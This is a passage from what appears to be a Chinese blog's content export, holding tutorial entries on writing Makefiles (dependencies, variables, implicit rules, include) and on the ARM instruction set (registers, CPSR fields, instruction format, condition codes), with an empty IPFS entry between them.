了。</span><br></pre></td></tr></table></figure><p>这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在 找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性。</p><p>像 <code>clean</code> 这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命 令将不会被自动执行，不过，我们可以显示要make执行。即命令—— <code>make clean</code> ，以此来清除所有 的目标文件，以便重编译。</p><p>如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 <code>file.c</code> ， 那么根据我们的依赖性，我们的目标 <code>file.o</code> 会被重编译（也就是在这个依性关系后面所定义的命令）， 于是 <code>file.o</code> 的文件也是最新的啦，于是 <code>file.o</code> 的文件修改时间要比 <code>edit</code> 要新，所 以 <code>edit</code> 也会被重新链接了（详见 <code>edit</code> 目标文件后定义的命令）。比如我们改变了 <code>command.h</code> ，那么， <code>kdb.o</code> 、 <code>command.o</code> 和 <code>files.o</code> 都 会被重编译，并且， <code>edit</code> 会被重链接。</p><h3 id="Makefile中使用变量"><a href="#Makefile中使用变量" class="headerlink" title="Makefile中使用变量"></a>Makefile中使用变量</h3><p>总所周知，变量是个好东西0.0</p><p>在Makefile中使用变量有利于我们对其有更好的维护性。</p><p>跟通常编程一样，变量名最好简(jian)洁(dan)易(cu)懂(bao)，有利于人们明白其代表的含义。</p><p>在上面例子中，edit后面的一串便可以进行替代了。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>当我们需要添加文件时，需要修改多个地方，使用变量能很好地为我们节省时间。</p><p>只需在前面声明变量就好，比如<code>objects</code>，<code>objs</code>，<code>obj</code>等等，只要能很好明白其代表的含义就行</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">objs = main.o kbd.o command.o display.o \</span><br><span class="line">     insert.o search.o files.o utils.o</span><br><span class="line">     </span><br><span class="line">edit : <span class="variable">$(objs)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objs)</span></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objs)</span></span><br></pre></td></tr></table></figure><p>比如这样，当我们需要添加新的 <code>.o</code> 文件的时候，只需要修改<code>objs =    ...</code>就行了</p><h3 id="Makefile的自动推导"><a href="#Makefile的自动推导" class="headerlink" title="Makefile的自动推导"></a>Makefile的自动推导</h3><p>GNU的make可以自动推到文件及文件依赖关系后面的命令，于是我们就没必要去在每一个 <code>.o</code> 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。</p><p>只要make看到一个 <code>.o</code> 文件，它就会自动的把 <code>.c</code> 文件加在依赖关系中，如果make找到一个<code>whatever.o</code> ，那么 <code>whatever.c</code> 就会是 <code>whatever.o</code> 的依赖文件。并且 <code>cc -c whatever.c</code> 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的 新makefile又出炉了。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line">main.o : defs.h</span><br><span class="line">kbd.o : defs.h command.h</span><br><span class="line">command.o : defs.h command.h</span><br><span class="line">display.o : defs.h buffer.h</span><br><span class="line">insert.o : defs.h buffer.h</span><br><span class="line">search.o : defs.h buffer.h</span><br><span class="line">files.o : defs.h buffer.h command.h</span><br><span class="line">utils.o : defs.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>这种方法，也就是make的“隐晦规则”。</p><p><code>.PHONY</code> 表示 <code>clean</code> 是个伪目标 文件。</p><h4 id="另类风格的Makefile"><a href="#另类风格的Makefile" class="headerlink" title="另类风格的Makefile"></a>另类风格的Makefile</h4><p>既然我们的make可以自动推导命令，那么我看到那堆 <code>.o</code> 和 <code>.h</code> 的依赖就有点不爽，那么多的 重复的 <code>.h</code> ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动 推导命令和文件的功能呢？来看看最新风格的makefile吧。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(objects)</span> : defs.h</span><br><span class="line">kbd.o command.o files.o : command.h</span><br><span class="line">display.o insert.o search.o files.o : buffer.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><h3 id="清空目标文件的规则"><a href="#清空目标文件的规则" class="headerlink" title="清空目标文件的规则"></a>清空目标文件的规则</h3><p>每个Makefile中都应该写一个清空目标文件（ <code>.o</code> 和执行文件）的规则，这不仅便于重编译，也很 利于保持文件的清洁。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>更为稳健的做法是：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    -rm edit <span class="variable">$(objects)</span></span><br></pre></td></tr></table></figure><p>前面说过， <code>.PHONY</code> 表示 <code>clean</code> 是一个“伪目标”。而在 <code>rm</code> 命令前面加了一个小减号的 意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， <code>clean</code> 的规则不要放在文件 的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放 在文件的最后”。</p><h3 id="Makefile里有什么？"><a href="#Makefile里有什么？" class="headerlink" title="Makefile里有什么？"></a>Makefile里有什么？</h3><p>Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。</p><ol><li><p>显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的 文件、文件的依赖文件和生成的命令。</p></li><li><p>隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。</p></li><li><p>变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的 宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。</p></li><li><p>文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中 的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一 样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。</p></li><li><p>注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 <code>#</code> 字符，这个就 像C/C++中的 <code>//</code> 一样。如果你要在你的Makefile中使用 <code>#</code> 字符，可以用反斜杠进行转义，如： <code>\#</code> 。</p></li></ol><p>   还有的就是在Makefile中的命令，必须要以 <code>Tab</code> 键开始。</p><h3 id="Makefile的文件名"><a href="#Makefile的文件名" class="headerlink" title="Makefile的文件名"></a>Makefile的文件名</h3><p>因为make程序已被用户多次重/改写，其中包括几次用相同的文件格式和算法原理重新编写，并且依照不同需要添加了一些不常见的改良。</p><p>现在的版本，大致是 <strong>GNU make</strong>，<strong>BSD make</strong>，<strong>Microsoft nmake</strong>。</p><p>默认的情况下，gnu的make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、 “makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile” 这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”， 这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说， 大多数的make都支持“makefile”和“Makefile”这两种默认文件名。</p><p>当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris” ，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 <code>-f</code> 和 <code>--file</code> 参数， 如： <code>make -f Make.Linux</code> 或 <code>make --file Make.AIX</code> 。</p><h3 id="引用其他的Makefile"><a href="#引用其他的Makefile" class="headerlink" title="引用其他的Makefile"></a>引用其他的Makefile</h3><p>在Makefile使用 <code>include</code> 关键字可以把别的Makefile包含进来，这很像C语言的 <code>#include</code> ，被包含的文件会原模原样的放在当前文件的包含位置。 <code>include</code> 的语法是：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> &lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>filename</code> 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。</p><p>在 <code>include</code> 前面可以有一些空字符，但是绝不能是 <code>Tab</code> 键开始。 <code>include</code> 和 <code>&lt;filename&gt;</code> 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： <code>a.mk</code> 、 <code>b.mk</code> 、 <code>c.mk</code> ，还有一个文件叫 <code>foo.make</code> ，以及一个变量 <code>$(bar)</code> ，其包含 了 <code>e.mk</code> 和 <code>f.mk</code> ，那么，下面的语句：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bar=e.mkf.mk</span><br><span class="line"><span class="keyword">include</span> foo.make *.mk <span class="variable">$(bar)</span></span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> foo.make a.mk b.mk c.mk e.mk f.mk</span><br></pre></td></tr></table></figure><p>make命令开始时，会找寻 <code>include</code> 所指出的其它Makefile，并把其内容安置在当前的位置。就好 像C/C++的 <code>#include</code> 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目 录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找：</p><ol><li>如果make执行时，有 <code>-I</code> 或 <code>--include-dir</code> 参数，那么make就会在这个参数所指定的目 录下去寻找。</li><li>如果目录 <code>&lt;prefix&gt;/include</code> （一般是： <code>/usr/local/bin</code> 或 <code>/usr/include</code> ）存在的话，make也会去找。</li></ol><p>如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的 文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是 不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以 在include前加一个减号“-”。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-include &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令 是sinclude，其作用和这一个是一样的。</p><h3 id="环境变量MAKEFILES"><a href="#环境变量MAKEFILES" class="headerlink" title="环境变量MAKEFILES"></a>环境变量MAKEFILES</h3><p>如果你的当前环境中定义了环境变量 <code>MAKEFILES</code> ，那么，make会把这个变量中的值做一个类似于<code>include</code> 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 <code>include</code> 不 同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现 错误，make也会不理。</p><p>但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时， 所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许 有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。</p><h3 id="make的工作流程"><a href="#make的工作流程" class="headerlink" title="make的工作流程"></a>make的工作流程</h3><p>GNU的make工作时的执行步骤如下：（想来其它的make也是类似）</p><ol><li>读入所有的Makefile。</li><li>读入被include的其它Makefile。</li><li>初始化文件中的变量。</li><li>推导隐晦规则，并分析所有规则。</li><li>为所有的目标文件创建依赖关系链。</li><li>根据依赖关系，决定哪些目标要重新生成。</li><li>执行生成命令。</li></ol><p>1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展 开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则 中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。</p><p>当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分 也就容易看懂了。</p><h2 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h2>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> make </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPFS</title>
      <link href="/2019/05/30/IPFS/"/>
      <url>/2019/05/30/IPFS/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM</title>
      <link href="/2019/05/28/ARM/"/>
      <url>/2019/05/28/ARM/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM指令集详解"><a href="#ARM指令集详解" class="headerlink" title="ARM指令集详解"></a>ARM指令集详解</h1><blockquote><p>引用：</p><p><a href="https://blog.csdn.net/u014069939/article/details/81107340" target="_blank" rel="noopener"><strong>ARM指令集详解</strong></a></p></blockquote><h1 id="1-汇编"><a href="#1-汇编" class="headerlink" title="1.       汇编"></a>1.       汇编</h1><h2 id="1-1-通用寄存器"><a href="#1-1-通用寄存器" class="headerlink" title="1.1.    通用寄存器"></a>1.1.    通用寄存器</h2><p><img src="/2019/05/28/ARM/arm.JPG" alt="Register"></p><table><br>    <tr><br>        <td>寄存器类别</td><br>        <td>寄存器在汇编中的名称</td><br>        <td>各模式下实际访问的寄存器</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td></td><br>        <td>用户</td><br>        <td>系统</td><br>        <td>管理</td><br>        <td>中止</td><br>        <td>未定义</td><br>        <td>中断</td><br>        <td>快中断</td><br>    </tr><br>    <tr><br>        <td>通用寄存器和程序计数器</td><br>        <td>R0(a1)</td><br>        <td>R0</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R1(a2)</td><br>        <td>R1</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R2(a3)</td><br>        <td>R2</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R3(a4)</td><br>        <td>R3</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R4(v1)</td><br>        <td>R4</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R5(v2)</td><br>        <td>R5</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R6(v3)</td><br>        <td>R6</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R7(v4)</td><br>        <td>R7</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R8(v5)</td><br>        <td>R8</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R8_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R9(SB,v6)</td><br>        <td>R9</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R9_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R10(SL,v7)</td><br>        <td>R10</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R10_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R11(FP,v8)</td><br>        <td>R11</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R11_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R12(IP)</td><br>        <td>R12</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td>R12_fiq <em></em></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R13(SP)</td><br>        <td>R13</td><br>        <td></td><br>        <td>R13_svc</td><br>        <td>R13_abt <em></em></td><br>        <td>R13_und </td><br>        <td>R13_irq <em></em></td><br>        <td>R13_fiq </td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R14(LR)</td><br>        <td>R14</td><br>        <td></td><br>        <td>R14_svc <em></em></td><br>        <td>R14_abt </td><br>        <td>R14_und <em></em></td><br>        <td>R14_irq </td><br>        <td>R14_fiq *</td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>R15(PC)</td><br>        <td>R15</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td>状态寄存器</td><br>        <td>R16(CPSR)</td><br>        <td>CPSR</td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>        <td></td><br>    </tr><br>    <tr><br>        <td></td><br>        <td>SPSR</td><br>        <td>无</td><br>        <td></td><br>        <td>SPSR_svc</td><br>        <td>SPSR_abt</td><br>        <td>SPSR_und</td><br>        <td>SPSR_irq</td><br>        <td>SPSR_fiq</td><br>    </tr><br>    <tr><br>        <td></td><br>    </tr><br></table><p><img src="/2019/05/28/ARM/arm_allRegister.png" alt="register"></p><p>通用寄存器</p><p>37个寄存器，31个通用寄存器，6个状态寄存器。</p><p>R12是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。在过程调用之间，可以将它用于任何用途。被调用函数在返回之前不必恢复 r12。</p><p>R13堆栈指针sp，R14返回指针，R15为PC指针, cpsr_c代表的是这32位中的低8位，也就是控制位</p><p>CPSR有4个8位区域：标志域（F）、状态域（S）、扩展域（X）、控制域（C）<br>MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register.</p><p> C 控制域屏蔽字节(psr[7:0]) </p><p>X 扩展域屏蔽字节(psr[15:8]) </p><p>S 状态域屏蔽字节(psr[23:16])</p><p> F 标志域屏蔽字节(psr[31:24])</p><p> <img src="/2019/05/28/ARM/register.JPG" alt="img"></p><p><img src="/2019/05/28/ARM/arm_register.png" alt="register"></p><p>CPSR寄存器</p><p>FIQ和IRQ的区别？</p><table><thead><tr><th>MODE(以下为二进制)</th><th></th><th>可见的ARM状态寄存器</th></tr></thead><tbody><tr><td>10000</td><td>用户模式</td><td>PC,CPSR,R0~R14</td></tr><tr><td>10001</td><td>FIQ</td><td>PC,CPSR,SPSR_fiq，R14_fiq~R8_fiq,R7~R0</td></tr><tr><td>10010</td><td>IRQ</td><td>PC,CPSR,SPSR_irq，R14_irq~R13_irq,R12~R0</td></tr><tr><td>10011</td><td>管理模式(svc)</td><td>PC,CPSR,SPSR_svc，R14_svc~R13_svc,R12~R0</td></tr><tr><td>10111</td><td>终止模式</td><td>PC,CPSR,SPSR_abt，R14_abt~R13_abt,R12~R0</td></tr><tr><td>11011</td><td>未定义</td><td>PC,CPSR,SPSR_und，R14_und~R13_und,R2~R0</td></tr><tr><td>11111</td><td>系统模式(sys)</td><td>PC,CPSR，R14 ~R0</td></tr></tbody></table><h2 id="1-2-指令格式"><a href="#1-2-指令格式" class="headerlink" title="1.2.    指令格式"></a>1.2.    指令格式</h2><p>1) 基本格式</p><p>​    <code>&lt;opcode&gt;{&lt;cond&gt;}{S} &lt;Rd&gt;,&lt;Rn&gt;{,&lt;opcode2&gt;}</code></p><p>​       其中，&lt;&gt;内的项是必须的，{}内的项是可选的，如<opcode>是指令助记符，是必须的，而{<cond>}为指令执行条件，是可选的，如果不写则使用默认条件AL(无条件执行)。</cond></opcode></p><p>​       opcode  指令助记符，如LDR，STR 等</p><p>​       cond  执行条件，如EQ，NE 等</p><p>​       S  是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响</p><p>​       Rd  目标寄存器</p><p>​       Rn  第一个操作数的寄存器</p><p>​       operand2  第二个操作数</p><p>​       指令格式举例如下：</p><p>​         LDREX–这条指令主要是从memory中取一个数，然后放到register中，但是相比普通的LDR指令，在于其内在的原子操作特性, 信号量和spin lock这些东西最核心的事情基本上就是load-update-store序列，为了防止并发，必须保证这个序列是原子的，所谓原子，即处理器在执行这个指令序列时，得绝对占有处理器而不能够被切换出去。在ARM上，从V6开始，指令LDREX和STREX就是用来干这事的</p><p>​       LDR R0,[R1] ;读取R1 地址上的存储器单元内容，执行条件AL<br>​        BEQ DATAEVEN ;跳转指令，执行条件EQ，即相等跳转到DATAEVEN<br>​        ADDS R1,R1,#1 ;加法指令，R1＋1＝R1 影响CPSR 寄存器，带有S<br>​        SUBNES R1,R1,#0xD;条件执行减法运算(NE)，R1-0xD=&gt;R1，影响CPSR 寄存器，带有S</p><p>2) 第2个操作数</p><p>​        在ARM 指令中，灵活的使用第2个操作数能提高代码效率，第2个操作数的形式如下：</p><p>​        ＃immed_8r</p><p>​       常数表达式：</p><p>​         该常数必须对应8 位位图，即常数是由一个8 位的常数循环移位偶数位得到。</p><p>​        合法常量：</p><p>​       0x3FC、0、0xF0000000、200、0xF0000001等都是合法常量。</p><p>​       非法常量：</p><p>​       0x1FE、511、0xFFFF、0x1010、0xF0000010等都是非法常量。</p><p>​        常数表达式应用举例如下：</p><p>​       <code>MOV R0,#1 ;R0=1</code></p><p>​       <code>AND R1,R2,#0x0F ;</code>R2 与0x0F，结果保存在R1</p><p>​       <code>LDR R0，[R1],#-4 ;</code>读取R1 地址上的存储器单元内容，且R1＝R1－4</p><p>​       Rm</p><p>​        寄存器方式，在寄存器方式下操作数即为寄存器的数值。</p><p>​        寄存器方式应用举例：</p><p>​       <code>SUB R1，R1，R2 ；R1-R2=＞R1</code></p><p>​       <code>MOV PC，R0 ；</code>PC=R0，程序跳转到指定地址</p><p>​       <code>LDR R0，[R1]，-R2 ；</code>读取R1 地址上的存储器单元内容并存入R0，且R1=R1-R2</p><p>​       Rm， shift</p><p>​        寄存器移位方式。将寄存器的移位结果作为操作数，但RM 值保存不变，移位方法如下：</p><p>​       ASR #n  算术右移n 位（1≤n≤32）</p><p>​       LSL #n  逻辑左移n 位（1≤n≤31）</p><p>​       LSR #n  逻辑左移n 位（1≤n≤32）</p><p>​       ROR #n  循环右移n 位（1≤n≤31）</p><p>​       RRX  带扩展的循环右移1位</p><p>​       type Rs  其中，type 为ASR，LSL，和ROR 中的一种；Rs 偏移量寄存器，低8位有效，若其值大于或等于32，则第2 个操作数的结果为0（ASR、ROR例外）。<br>​        寄存器偏移方式应用举例：</p><p>​       ADD R1，R1，R1，LSL #3 ；R1=R1*9</p><p>​       SUB R1，R1，R2，LSR#2 ；R1=R1-R2*4</p><p>​       R15 为处理器的程序计数器PC，一般不要对其进行操作，而且有些指令是不允许使用R15，如UMULL 指令。<br>​        （3）条件码<br>​        使用指令条件码，可实现高效的逻辑操作，提高代码效率。表A-1给出条件码表。</p><p>表A-1  条件码表</p><p>​        对于Thumb指令集，只有B 指令具有条件码执行功能，此指令条件码同表A-?，但如果为无条件执行时，条件码助记符“AL”不在指令中书写。</p><p>​        条件码应用举例如下：</p><p>​        比较两个值大小，并进行相应加1 处理，C 代码为：<br>​        if（a＞b）a++       ;<br>​        else b++           ;<br>​        对应的ARM 指令如下。其中R0为a，R1为b。<br>​        CMP R0，R1        ; R0 与R1 比较<br>​        ADDHI R0，R0，#1        ; 若R0＞R1，则R0=R0+1<br>​        ADDLS R1，R1，#1        ;若R0＜=R1，则R1=R1+1<br>​        若两个条件均成立，则将这两个数值相加，C代码为：</p><p>​        If(（a!=10）&amp;&amp;(b!=20))a=a+b;</p><p>​        对应的ARM 指令如下，其中R0 为a，R1为b。<br>​        CMP R0,#10            ; 比较R0 是否为10<br>​        CMPNE R1,#20        ; 若R0 不为10，则比较R1 是否20<br>​        ADDNE R0,R0,R1        ; 若R0 不为10 且R1 不为20，指令执行，R0=R0+R1</p><h2 id="1-3-指令集"><a href="#1-3-指令集" class="headerlink" title="1.3.    指令集"></a>1.3.    指令集</h2><h3 id="1-3-1-ARM-存储器访问指令"><a href="#1-3-1-ARM-存储器访问指令" class="headerlink" title="1.3.1.   ARM 存储器访问指令"></a>1.3.1.   ARM 存储器访问指令</h3><p>​        ARM 处理是加载/存储体系结构的典型的RISC处理器，对存储器的访问只能使用加载和存储指令实现。ARM 的加载/存储指令是可以实现字、半字、无符/有符字节操作；批量加载/存储指令可实现一条指令加载/存储多个寄存器的内容，大大提高效率；SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等。ARM 处理器是冯?诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载/存储指令进行。表A-2给出ARM存储访问指令表。</p><p>表A-2  ARM 存储访问指令表</p><p><img src="/2019/05/28/ARM/arm储存访问指令表.JPG" alt="img"></p><h4 id="LDR-和STR"><a href="#LDR-和STR" class="headerlink" title="LDR 和STR"></a><strong>LDR 和STR</strong></h4><p>​    加载/存储字和无符号字节指令。使用单一数据传送指令(STR 和LDR)来装载和存储单一字节或字的数据从/到内存。LDR指令用于从内存中读取数据放入寄存器中；STR 指令用于将寄存器中的数据保存到内存。指令格式如下：<br>​    <code>LDR{cond}{T} Rd,&lt;地址&gt;;</code>    加载指定地址上的数据(字)，放入Rd中<br>​    <code>STR{cond}{T} Rd,&lt;地址&gt;;</code>    存储数据(字)到指定地址的存储单元，要存储的数据在Rd中<br>​    <code>LDR{cond}B{T} Rd,&lt;地址&gt;;</code>  加载字节数据，放入Rd中，即Rd最低字节有效，高24位清零<br>​    <code>STR{cond}B{T} Rd,&lt;地址&gt;;</code>  存储字节数据，要存储的数据在Rd，最低字节有效<br>​    其中，T 